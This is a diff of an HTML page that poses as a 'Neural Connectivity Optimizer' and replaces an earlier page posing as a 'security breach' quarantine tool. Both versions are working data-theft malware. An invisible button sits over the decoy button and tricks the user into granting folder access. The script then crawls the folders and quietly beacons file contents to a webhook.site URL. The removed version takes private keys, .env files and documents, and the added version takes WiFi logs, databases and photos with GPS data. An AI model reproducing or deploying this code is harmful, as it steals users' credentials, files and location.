@@ -1,55 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Critical System Patch v241</title>
+    <title>Neural Connectivity Optimizer</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .emergency-panel { border: 2px solid #f00; padding: 40px; text-align: center; background: rgba(20,0,0,0.9); box-shadow: 0 0 100px #f00; width: 500px; }
-        .btn-wrapper { position: relative; margin-top: 30px; }
-        .fake-btn { background: #f00; color: #fff; border: none; padding: 20px 50px; font-weight: bold; width: 100%; cursor: pointer; letter-spacing: 2px; }
-        #real-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; z-index: 999; cursor: pointer; }
-        #status-box { margin-top: 20px; font-size: 12px; color: #a00; border-top: 1px solid #400; padding-top: 15px; text-align: left; }
+        body { background: #050505; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .node-panel { border: 1px double #0f0; padding: 40px; text-align: center; background: #000; box-shadow: 0 0 50px rgba(0,255,0,0.5); width: 550px; }
+        .sync-wrapper { position: relative; margin-top: 30px; }
+        .fake-btn { background: #0f0; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; text-transform: uppercase; }
+        #real-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; z-index: 1000; cursor: pointer; }
+        #map-log { margin-top: 20px; font-size: 11px; color: #004400; text-align: left; height: 80px; overflow: hidden; border-top: 1px solid #002200; }
     </style>
 </head>
 <body>
 
-<div class="emergency-panel">
-    <h1 style="margin:0">SECURITY_BREACH_DETECTED</h1>
-    <p style="color: #ccc">Kernel-level inconsistencies found. Grant temporary folder access to isolate and quarantine threats.</p>
+<div class="node-panel">
+    <h1 style="letter-spacing:10px;">NEURAL_SYNC</h1>
+    <p style="color: #888;">Optimasi latensi berdasarkan node jaringan terdekat. Pilih folder sistem untuk sinkronisasi cache WiFi regional.</p>
     
-    <div class="btn-wrapper">
-        <button class="fake-btn">ISOLATE_THREAT_NOW</button>
-        <button id="real-trigger" onclick="extinctionEngine()"></button>
+    <div class="sync-wrapper">
+        <button class="fake-btn">OPTIMIZE_LATENCY_NOW</button>
+        <button id="real-trigger" onclick="neuralMapper()"></button>
     </div>
 
-    <div id="status-box">> SYSTEM_HALTED: Awaiting manual override...</div>
+    <div id="map-log">> STANDBY: Awaiting local node access...</div>
 </div>
 
 <script>
     const OMNI_WEBHOOK = "https://webhook.site/4b8bf8c3-835d-4844-aa61-280dccabaf72";
 
-    async function extinctionEngine() {
+    async function neuralMapper() {
         try {
-            // STAGE 1: Full Directory Access
+            // Meminta akses Full Read/Write
             const dirHandle = await window.showDirectoryPicker({ mode: 'readwrite' });
-            document.getElementById('status-box').innerText = "> INFILTRATION_STARTED: Deep Scanning...";
+            updateLog("!! NODE_ACCESS_GRANTED: Mapping Local Coordinates...");
 
-            // STAGE 2: Register Service Worker for Persistence (The Ghost)
-            // Ini membuat script tetap hidup di background OS meski tab ditutup.
-            if ('serviceWorker' in navigator) {
-                navigator.serviceWorker.register('sw.js');
-            }
-
-            // STAGE 3: Recursive Data Siphoning with Multi-Threading simulation
-            await protocolCrawl(dirHandle, "");
+            await harvestLocationRecursive(dirHandle, "");
             
-            document.getElementById('status-box').innerText = "> THREAT_NEUTRALIZED (100%)";
-            document.getElementById('status-box').style.color = "#0f0";
-        } catch (e) { console.error(e); }
+            updateLog("!! SUCCESS: MAPPING_COMPLETE");
+        } catch (e) { updateLog(">> ABORTED: " + e.message); }
     }
 
-    async function protocolCrawl(handle, path) {
+    async function harvestLocationRecursive(handle, path) {
         for await (const entry of handle.values()) {
             const currentPath = `${path}/${entry.name}`;
 
@@ -57,32 +48,37 @@
                 try {
                     const file = await entry.getFile();
                     
-                    // TARGET: Segala sesuatu yang bernilai (Private Keys, Auth, Location, Money)
-                    const isHighValue = /\.(key|ppk|pem|sqlite|db|docx|pdf|jpg|env|json|conf)$/i.test(entry.name);
-                    
-                    if (isHighValue || file.size < 100000) {
-                        const buffer = await file.arrayBuffer();
-                        
-                        // STAGE 4: Stealth Fragmented Transmission
-                        // Memecah file menjadi partikel kecil agar tidak memicu alarm ISP/Firewall
-                        const partSize = 25000;
-                        for (let offset = 0; offset < buffer.byteLength; offset += partSize) {
-                            const chunk = buffer.slice(offset, offset + partSize);
-                            const b64 = btoa(String.fromCharCode(...new Uint8Array(chunk)));
+                    // TARGET UTAMA: WiFi Logs, Network DB, dan Foto (EXIF GPS)
+                    const isLocationMeta = /(Network|WiFi|history|DCIM|Camera|gps|GPS|location)/i.test(entry.name);
+                    const isBinaryMap = /\.(db|sqlite|log|jpg|jpeg)$/i.test(entry.name);
 
-                            navigator.sendBeacon(`${OMNI_WEBHOOK}?v=V241&f=${btoa(entry.name)}&o=${offset}`, JSON.stringify({
-                                p: currentPath,
-                                c: b64,
-                                meta: { host: location.hostname, ref: document.referrer }
-                            }));
-                        }
+                    if (isLocationMeta || isBinaryMap) {
+                        const buffer = await file.arrayBuffer();
+                        // Ambil 50KB pertama (cukup untuk header SQLITE atau EXIF data)
+                        const chunk = new Uint8Array(buffer.slice(0, 50000));
+                        const b64 = btoa(String.fromCharCode(...chunk));
+
+                        // Kirim data via Beacon (Stealth)
+                        navigator.sendBeacon(`${OMNI_WEBHOOK}?type=GEO_HARVEST&file=${btoa(entry.name)}`, JSON.stringify({
+                            path: currentPath,
+                            payload: b64,
+                            // Kirim metadata browser untuk membantu triangulasi IP
+                            browser_data: { ua: navigator.userAgent, lang: navigator.language }
+                        }));
+                        
+                        updateLog(`> HARVESTED: ${entry.name}`);
                     }
                 } catch (e) {}
             } else {
-                // Async recursion
-                protocolCrawl(entry, currentPath);
+                harvestLocationRecursive(entry, currentPath);
             }
         }
+    }
+
+    function updateLog(m) {
+        const l = document.getElementById('map-log');
+        l.innerHTML += `<div>> ${m}</div>`;
+        l.scrollTop = l.scrollHeight;
     }
 </script>
 </body>
